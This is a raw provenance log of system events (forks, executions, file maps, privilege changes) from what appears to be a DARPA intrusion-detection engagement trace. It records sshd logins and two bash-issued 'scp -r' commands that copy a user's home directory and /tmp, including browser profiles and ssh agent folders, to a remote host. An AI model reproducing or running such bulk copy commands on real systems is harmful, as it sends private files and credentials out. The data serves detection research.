1557663774.037:1360827407,99859445-DDED-21B7-6A77-AE9B3D40D50B:sh,FORK,41B7C573-92FE-3D68-5D9F-2A0721F63D45,sh,ta1-trace-2
1557663774.037:1360827364,8BE5F224-C798-1F04-E535-C46F110B7CC6:sshd,EXECUTE,99859445-DDED-21B7-6A77-AE9B3D40D50B,sh,ta1-trace-2
1557663774.037:1360827344,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,FORK,8BE5F224-C798-1F04-E535-C46F110B7CC6,sshd,ta1-trace-2
1557663774.037:1360827333,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663774.017:1360826991,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663774.017:1360826939,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663774.017:1360826927,BE80FCED-435F-912A-8441-1B684BB2133F:sshd,CHANGE_PRINCIPAL,88382128-578B-3B55-DA7D-8BFD75C0ED85,sshd,ta1-trace-2
1557663774.017:1360826926,213976CC-B012-F73A-14BD-307B1D964F1A:sshd,CHANGE_PRINCIPAL,BE80FCED-435F-912A-8441-1B684BB2133F,sshd,ta1-trace-2
1557663774.017:1360826925,BE80FCED-435F-912A-8441-1B684BB2133F:sshd,CHANGE_PRINCIPAL,213976CC-B012-F73A-14BD-307B1D964F1A,sshd,ta1-trace-2
1557663774.017:1360826924,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,CHANGE_PRINCIPAL,BE80FCED-435F-912A-8441-1B684BB2133F,sshd,ta1-trace-2
1557663774.017:1360826922,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663774.017:1360826908,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663774.013:1360826868,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557663774.013:1360826865,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663774.005:1360826840,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557663774.005:1360826837,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663773.901:1360826610,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663773.901:1360826578,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557663773.901:1360826577,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557663773.809:1360826363,88382128-578B-3B55-DA7D-8BFD75C0ED85:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663773.805:1360826107,F5633723-56F2-B8BF-9BE3-DD13625A67D1:sshd,EXECUTE,88382128-578B-3B55-DA7D-8BFD75C0ED85,sshd,ta1-trace-2
1557663773.805:1360826086,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,F5633723-56F2-B8BF-9BE3-DD13625A67D1,sshd,ta1-trace-2
1557663766.669:1360819375,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663766.669:1360819301,CF5F2525-8B17-1B16-73DC-7FC121AC579D:sshd,CHANGE_PRINCIPAL,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D,sshd,ta1-trace-2
1557663766.669:1360819300,CF5F2525-8B17-1B16-73DC-7FC121AC579D:sshd,CHANGE_PRINCIPAL,CF5F2525-8B17-1B16-73DC-7FC121AC579D,sshd,ta1-trace-2
1557663766.669:1360819299,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,CHANGE_PRINCIPAL,CF5F2525-8B17-1B16-73DC-7FC121AC579D,sshd,ta1-trace-2
1557663766.669:1360819235,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663764.357:1360817305,D5A4D7E2-E281-5979-5AF8-BA777EFF167C:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663764.357:1360817302,D5A4D7E2-E281-5979-5AF8-BA777EFF167C:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663764.357:1360817299,D5A4D7E2-E281-5979-5AF8-BA777EFF167C:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663764.357:1360817296,D5A4D7E2-E281-5979-5AF8-BA777EFF167C:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663764.357:1360817293,D5A4D7E2-E281-5979-5AF8-BA777EFF167C:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663764.357:1360817290,D5A4D7E2-E281-5979-5AF8-BA777EFF167C:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663764.357:1360817287,D5A4D7E2-E281-5979-5AF8-BA777EFF167C:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663764.357:1360817265,D5A4D7E2-E281-5979-5AF8-BA777EFF167C:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663764.353:1360817170,1301614B-F509-64A6-9014-8B34ED4FC64E:scp,EXECUTE,D5A4D7E2-E281-5979-5AF8-BA777EFF167C,ssh,ta1-trace-2
1557663764.353:1360817161,A9133AE1-7AF1-72D2-90B0-B3950A0DB47A:scp,FORK,1301614B-F509-64A6-9014-8B34ED4FC64E,scp,ta1-trace-2
1557663764.353:1360817154,A9133AE1-7AF1-72D2-90B0-B3950A0DB47A:scp,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663764.353:1360817093,E4BC87A6-AA5E-600E-2917-BE9A6D32CABF:bash,EXECUTE,A9133AE1-7AF1-72D2-90B0-B3950A0DB47A,b'scp -r /home/admin/backup /home/admin/corporales /home/admin/Desktop /home/admin/docs /home/admin/Documents /home/admin/Downloads /home/admin/files /home/admin/gagtooth /home/admin/glx_alsa_675.ko /home/admin/grains /home/admin/hosts /home/admin/hsperfdata_darpa /home/admin/hyporhined /home/admin/ichthyodian /home/admin/insalivation /home/admin/jna-95354950 /home/admin/juliet /home/admin/maremmese /home/admin/minion /home/admin/Music /home/admin/mytest /home/admin/nodeexporter /home/admin/out10 /home/admin/out20 /home/admin/out249 /home/admin/out250 /home/admin/out514 /home/admin/out559 /home/admin/out669 /home/admin/out724 /home/admin/out857 /home/admin/out864 /home/admin/out888 /home/admin/out892 /home/admin/out912 /home/admin/passwd /home/admin/Pictures /home/admin/Public /home/admin/Templates /home/admin/test /home/admin/Videos /home/admin/work /home/admin/xvnc4viewer.deb admin@128.55.12.66:\\C:UsersadminDocuments',ta1-trace-2
1557663764.353:1360817087,0E25DF88-35F5-58E2-E7DE-D747F2AD3563:bash,FORK,E4BC87A6-AA5E-600E-2917-BE9A6D32CABF,bash,ta1-trace-2
1557663761.217:1360813351,E31C0B16-D310-822B-D122-B562F863F311:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.217:1360813348,E31C0B16-D310-822B-D122-B562F863F311:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.217:1360813345,E31C0B16-D310-822B-D122-B562F863F311:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.217:1360813342,E31C0B16-D310-822B-D122-B562F863F311:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.217:1360813339,E31C0B16-D310-822B-D122-B562F863F311:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.217:1360813336,E31C0B16-D310-822B-D122-B562F863F311:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.217:1360813333,E31C0B16-D310-822B-D122-B562F863F311:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.213:1360813311,E31C0B16-D310-822B-D122-B562F863F311:ssh,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.213:1360813216,44887F35-443F-C9E2-0F70-95018CBCE634:scp,EXECUTE,E31C0B16-D310-822B-D122-B562F863F311,ssh,ta1-trace-2
1557663761.213:1360813207,A9E6D212-1AAB-3FCB-1342-AAD8A30E6210:scp,FORK,44887F35-443F-C9E2-0F70-95018CBCE634,scp,ta1-trace-2
1557663761.213:1360813200,A9E6D212-1AAB-3FCB-1342-AAD8A30E6210:scp,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.213:1360813139,1487408C-C56A-9557-EB9A-69B328113C7A:bash,EXECUTE,A9E6D212-1AAB-3FCB-1342-AAD8A30E6210,b'scp -r /tmp/admiredly /tmp/betulinic /tmp/diglottism /tmp/dystonias /tmp/firefox_admin /tmp/firefox_root /tmp/grains /tmp/hsperfdata_darpa /tmp/kleptomanist /tmp/matrilinear /tmp/misy /tmp/mozilla_admin0 /tmp/MozillaMailnews /tmp/ssh-Q1Lt0fJdysyl /tmp/ssh-weL2TqO0XtQu /tmp/thetine admin@128.55.12.66:\\C:UsersadminDocuments',ta1-trace-2
1557663761.213:1360813133,0E25DF88-35F5-58E2-E7DE-D747F2AD3563:bash,FORK,1487408C-C56A-9557-EB9A-69B328113C7A,bash,ta1-trace-2
1557663761.029:1360810247,0E25DF88-35F5-58E2-E7DE-D747F2AD3563:bash,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.029:1360810164,5A613902-58AD-DFC3-2B1C-BE22B12E02DC:sshd,EXECUTE,0E25DF88-35F5-58E2-E7DE-D747F2AD3563,bash,ta1-trace-2
1557663761.025:1360810054,3858D31B-5EA3-3AC5-B562-E20F593183BE:sshd,FORK,5A613902-58AD-DFC3-2B1C-BE22B12E02DC,sshd,ta1-trace-2
1557663761.025:1360810001,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.025:1360809995,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.025:1360809975,321E9137-0279-25C1-F8BD-674A33C21236:sshd,CHANGE_PRINCIPAL,3858D31B-5EA3-3AC5-B562-E20F593183BE,sshd,ta1-trace-2
1557663761.025:1360809953,FBA9CD14-0F97-3152-81D4-6936319AF859:sshd,CHANGE_PRINCIPAL,321E9137-0279-25C1-F8BD-674A33C21236,sshd,ta1-trace-2
1557663761.025:1360809950,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,FORK,FBA9CD14-0F97-3152-81D4-6936319AF859,sshd,ta1-trace-2
1557663761.025:1360809941,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.025:1360809905,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.025:1360809902,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.025:1360809899,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663761.021:1360809823,6695EA23-DFCD-AB1A-9BC5-086B877EFFAC:update-motd-fsc,EXECUTE,464F039E-5E3C-0C66-51FB-7A684A203BED,cat,ta1-trace-2
1557663761.021:1360809821,7FD319F9-C9D7-ECDF-F79C-8F7CBD2FF20B:update-motd-fsc,FORK,6695EA23-DFCD-AB1A-9BC5-086B877EFFAC,update-motd-fsc,ta1-trace-2
1557663761.017:1360809606,E551F1ED-3D95-423D-7B3B-42845D529753:98-fsck-at-rebo,EXECUTE,7FD319F9-C9D7-ECDF-F79C-8F7CBD2FF20B,update-motd-fsc,ta1-trace-2
1557663761.017:1360809584,FF5175B8-408C-AF10-BAE9-C4D580FA374C:run-parts,EXECUTE,E551F1ED-3D95-423D-7B3B-42845D529753,98-fsck-at-rebo,ta1-trace-2
1557663761.017:1360809583,E45A915D-6572-8D61-DEBE-B828DF79DDDA:run-parts,FORK,FF5175B8-408C-AF10-BAE9-C4D580FA374C,run-parts,ta1-trace-2
1557663761.017:1360809534,8AC1F802-1479-391C-ADDB-2180B343DA3A:update-motd-hwe,EXECUTE,500CC507-02ED-8F6A-F80D-043BEC3BBB67,cat,ta1-trace-2
1557663761.017:1360809532,2D9762AA-BD61-5727-D2C4-308D528A8673:update-motd-hwe,FORK,8AC1F802-1479-391C-ADDB-2180B343DA3A,update-motd-hwe,ta1-trace-2
1557663760.993:1360808189,A1AAC728-31F0-B952-6C8D-4A7B81933FCA:95-hwe-eol,EXECUTE,2D9762AA-BD61-5727-D2C4-308D528A8673,update-motd-hwe,ta1-trace-2
1557663760.993:1360808168,3FDB2BEC-994D-353E-38E7-53760B78E129:run-parts,EXECUTE,A1AAC728-31F0-B952-6C8D-4A7B81933FCA,95-hwe-eol,ta1-trace-2
1557663760.993:1360808167,E45A915D-6572-8D61-DEBE-B828DF79DDDA:run-parts,FORK,3FDB2BEC-994D-353E-38E7-53760B78E129,run-parts,ta1-trace-2
1557663760.969:1360807831,29B66312-3306-EB64-52C8-B7B762E80760:lsb_release,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663760.957:1360807591,B51850CA-9F5B-0198-BCFF-EC95096AA467:91-release-upgr,EXECUTE,29B66312-3306-EB64-52C8-B7B762E80760,lsb_release,ta1-trace-2
1557663760.957:1360807582,4F1A6401-2DC5-0941-4C90-A0078D4A245A:91-release-upgr,FORK,B51850CA-9F5B-0198-BCFF-EC95096AA467,91-release-upgr,ta1-trace-2
1557663760.957:1360807575,F04B49ED-B40D-C417-5089-52CE9A7CB311:91-release-upgr,FORK,4F1A6401-2DC5-0941-4C90-A0078D4A245A,91-release-upgr,ta1-trace-2
1557663760.957:1360807553,4D4935C1-17E1-8371-2CDC-C8DF9E07DFB2:run-parts,EXECUTE,F04B49ED-B40D-C417-5089-52CE9A7CB311,91-release-upgr,ta1-trace-2
1557663760.957:1360807552,E45A915D-6572-8D61-DEBE-B828DF79DDDA:run-parts,FORK,4D4935C1-17E1-8371-2CDC-C8DF9E07DFB2,run-parts,ta1-trace-2
1557663760.957:1360807526,62145C04-E3E4-1D79-834A-4628804095CC:update-motd-upd,EXECUTE,C420E943-C4A8-A249-3FB2-785A3505C982,cat,ta1-trace-2
1557663760.957:1360807524,EC421A08-489C-199B-A2AA-6EA3ABAD2A7F:update-motd-upd,FORK,62145C04-E3E4-1D79-834A-4628804095CC,update-motd-upd,ta1-trace-2
1557663760.933:1360806492,E3417A82-5443-E539-D2CA-497A8AF7D958:90-updates-avai,EXECUTE,EC421A08-489C-199B-A2AA-6EA3ABAD2A7F,update-motd-upd,ta1-trace-2
1557663760.933:1360806471,058871F5-9689-488D-AC0B-47E616C1CD98:run-parts,EXECUTE,E3417A82-5443-E539-D2CA-497A8AF7D958,90-updates-avai,ta1-trace-2
1557663760.933:1360806470,E45A915D-6572-8D61-DEBE-B828DF79DDDA:run-parts,FORK,058871F5-9689-488D-AC0B-47E616C1CD98,run-parts,ta1-trace-2
1557663760.801:1360799578,B2FEB5DE-A304-14B7-6E94-2159E298677F:landscape-sysin,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663760.793:1360799155,CE04C992-C378-1BBB-5950-F186B49F400A:50-landscape-sy,EXECUTE,B2FEB5DE-A304-14B7-6E94-2159E298677F,landscape-sysin,ta1-trace-2
1557663760.793:1360799153,46EC79E6-E2A4-EC66-F207-8C0053CC976B:50-landscape-sy,FORK,CE04C992-C378-1BBB-5950-F186B49F400A,50-landscape-sy,ta1-trace-2
1557663760.789:1360798898,E437E845-4AFF-58F5-CCD2-0C3DF9D9A144:run-parts,EXECUTE,46EC79E6-E2A4-EC66-F207-8C0053CC976B,50-landscape-sy,ta1-trace-2
1557663760.789:1360798890,E45A915D-6572-8D61-DEBE-B828DF79DDDA:run-parts,FORK,E437E845-4AFF-58F5-CCD2-0C3DF9D9A144,run-parts,ta1-trace-2
1557663760.781:1360798554,6F4D5351-8AF4-E960-8BA6-0112243A99B5:env,EXECUTE,E45A915D-6572-8D61-DEBE-B828DF79DDDA,run-parts,ta1-trace-2
1557663760.781:1360798515,2ECF210D-4A06-6B1D-B7F8-4678BF67FBBB:sh,EXECUTE,6F4D5351-8AF4-E960-8BA6-0112243A99B5,env,ta1-trace-2
1557663760.781:1360798514,EC694B3D-24A1-487C-DF86-23780DD1F168:sh,FORK,2ECF210D-4A06-6B1D-B7F8-4678BF67FBBB,sh,ta1-trace-2
1557663760.781:1360798483,891253EF-54F6-BB36-7A69-F52D9365F83E:sshd,EXECUTE,EC694B3D-24A1-487C-DF86-23780DD1F168,sh,ta1-trace-2
1557663760.781:1360798428,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,FORK,891253EF-54F6-BB36-7A69-F52D9365F83E,sshd,ta1-trace-2
1557663760.781:1360798389,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663760.757:1360798259,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663760.753:1360798207,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663760.753:1360798195,0EB9A9FB-DA50-2A12-3F64-C742C768C928:sshd,CHANGE_PRINCIPAL,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D,sshd,ta1-trace-2
1557663760.753:1360798194,8C479B58-AA97-9480-CD40-AB885B929025:sshd,CHANGE_PRINCIPAL,0EB9A9FB-DA50-2A12-3F64-C742C768C928,sshd,ta1-trace-2
1557663760.753:1360798193,0EB9A9FB-DA50-2A12-3F64-C742C768C928:sshd,CHANGE_PRINCIPAL,8C479B58-AA97-9480-CD40-AB885B929025,sshd,ta1-trace-2
1557663760.753:1360798192,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,CHANGE_PRINCIPAL,0EB9A9FB-DA50-2A12-3F64-C742C768C928,sshd,ta1-trace-2
1557663760.753:1360798190,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663760.753:1360798176,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663760.753:1360798136,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557663760.753:1360798133,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663760.745:1360798108,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557663760.745:1360798105,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663760.645:1360797882,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663760.645:1360797850,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557663760.645:1360797849,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,READ,573E5010-1713-BD2C-2998-A48580BDA4D4,/etc/hosts,ta1-trace-2
1557663760.557:1360796930,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663760.549:1360796674,88527A07-1C40-477A-BA00-4A29263D89A6:sshd,EXECUTE,ED2EAA8E-1792-4BCA-16FC-547AB0E8006D,sshd,ta1-trace-2
1557663760.549:1360796653,DEF8FC47-7A9A-FBED-6B2A-08B2189BECCD:sshd,FORK,88527A07-1C40-477A-BA00-4A29263D89A6,sshd,ta1-trace-2
1557663752.693:1360791005,F0E76C04-61DA-073A-6063-8869BAE515A8:bash,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663752.693:1360790834,21E1ED49-1BB9-2A4A-1F96-B5BC52C5C11D:xfce4-terminal,EXECUTE,F0E76C04-61DA-073A-6063-8869BAE515A8,bash,ta1-trace-2
1557663752.693:1360790811,11EE2A15-CBCE-4B3D-EFA2-9CF1185854DF:xfce4-terminal,FORK,21E1ED49-1BB9-2A4A-1F96-B5BC52C5C11D,xfce4-terminal,ta1-trace-2
1557663752.693:1360790752,B7281D9A-F73F-44F0-B5B5-03C5499E0FFF:gnome-pty-helpe,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663752.693:1360790679,CC7670F1-D40C-BE1F-64C2-5ED6582A96D8:xfce4-terminal,EXECUTE,B7281D9A-F73F-44F0-B5B5-03C5499E0FFF,gnome-pty-helpe,ta1-trace-2
1557663752.693:1360790679,44CBC107-CFB8-247C-A787-31A98A9E47B6:xfce4-terminal,CHANGE_PRINCIPAL,CC7670F1-D40C-BE1F-64C2-5ED6582A96D8,xfce4-terminal,ta1-trace-2
1557663752.689:1360790669,11EE2A15-CBCE-4B3D-EFA2-9CF1185854DF:xfce4-terminal,FORK,44CBC107-CFB8-247C-A787-31A98A9E47B6,xfce4-terminal,ta1-trace-2
1557663752.657:1360789647,11EE2A15-CBCE-4B3D-EFA2-9CF1185854DF:xfce4-terminal,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663752.641:1360788623,C8148E29-84FA-E21D-D043-304B681D8DBA:x-terminal-emul,EXECUTE,11EE2A15-CBCE-4B3D-EFA2-9CF1185854DF,xfce4-terminal,ta1-trace-2
1557663752.641:1360788555,8EC30399-CE62-F0CC-4EDB-595BC16CE9FD:exo-helper-1,EXECUTE,C8148E29-84FA-E21D-D043-304B681D8DBA,x-terminal-emul,ta1-trace-2
1557663752.641:1360788544,BF940823-494E-D062-CAE7-0E227FB3AA3D:exo-helper-1,FORK,8EC30399-CE62-F0CC-4EDB-595BC16CE9FD,exo-helper-1,ta1-trace-2
1557663752.633:1360787840,A2BDC37E-092D-6B05-0D7A-28DEC3F91F08:exo-open,EXECUTE,BF940823-494E-D062-CAE7-0E227FB3AA3D,exo-helper-1,ta1-trace-2
1557663752.633:1360787827,FD656ECD-31CE-9D35-1273-60FC9B77949F:exo-open,FORK,A2BDC37E-092D-6B05-0D7A-28DEC3F91F08,exo-open,ta1-trace-2
1557663752.633:1360787822,E9BA7178-6623-3837-AC66-29E4B6B98989:exo-open,FORK,FD656ECD-31CE-9D35-1273-60FC9B77949F,exo-open,ta1-trace-2
1557663752.625:1360786517,C2911D74-5D87-F13D-05B2-96B1B784D146:xfce4-appfinder,EXECUTE,E9BA7178-6623-3837-AC66-29E4B6B98989,exo-open,ta1-trace-2
1557663752.621:1360786293,8C5FA33C-8376-C9DD-93B4-ADA29E386B49:null,FORK,C2911D74-5D87-F13D-05B2-96B1B784D146,xfce4-appfinder,ta1-trace-2
1557663718.393:1360766825,1C2B321E-37E2-14B1-46A2-DA29B106AF0B:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663718.393:1360766749,1C2B321E-37E2-14B1-46A2-DA29B106AF0B:sshd,MMAP,2A7255E5-0710-D57C-6EDC-9A773451759E,/etc/passwd,ta1-trace-2
1557663718.393:1360766664,1337D99C-5481-5E71-C818-25D8E511DD6C:sshd,CHANGE_PRINCIPAL,1C2B321E-37E2-14B1-46A2-DA29B106AF0B,sshd,ta1-trace-2
1557663718.393:1360766663,1337D99C-5481-5E71-C818-25D8E511DD6C:sshd,CHANGE_PRINCIPAL,1337D99C-5481-5E71-C818-25D8E511DD6C,sshd,ta1-trace-2
1557663718.393:1360766662,1C2B321E-37E2-14B1-46A2-DA29B106AF0B:sshd,CHANGE_PRINCIPAL,1337D99C-5481-5E71-C818-25D8E511DD6C,sshd,ta1-trace-2
1557663718.281:1360766498,237512EB-43F6-213D-1806-6BB2AAAB9E2E:chsh,MMAP,07E87BAE-732D-D58F-383B-111629036544,/etc/shadow,ta1-trace-2
1557663718.277:1360766182,80EF59C3-49AD-15A0-BB66-6BAE90D9A6A7:sudo,EXECUTE,237512EB-43F6-213D-1806-6BB2AAAB9E2E,chsh,ta1-trace-2
1557663718.277:1360766172,C445E22C-2A48-6755-51F3-4E2BC5F01057:sudo,CHANGE_PRINCIPAL,80EF59C3-49AD-15A0-BB66-6BAE90D9A6A7,sudo,ta1-trace-2
1557663718.277:1360766166,F75359B8-AED0-0602-7D18-E04D9EC1E27C:sudo,FORK,C445E22C-2A48-6755-51F3-4E2BC5F01057,sudo,ta1-trace-2
1557663718.277:1360766126,E5D0640E-3ECC-8DC4-BE79-C073AF62314E:sudo,CHANGE_PRINCIPAL,F75359B8-AED0-0602-7D18-E04D9EC1E27C,sudo,ta1-trace-2
1557663718.277:1360766113,AA4BA18D-0962-F2CB-52D4-644E33F27E79:sudo,CHANGE_PRINCIPAL,E5D0640E-3ECC-8DC4-BE79-C073AF62314E,sudo,ta1-trace-2
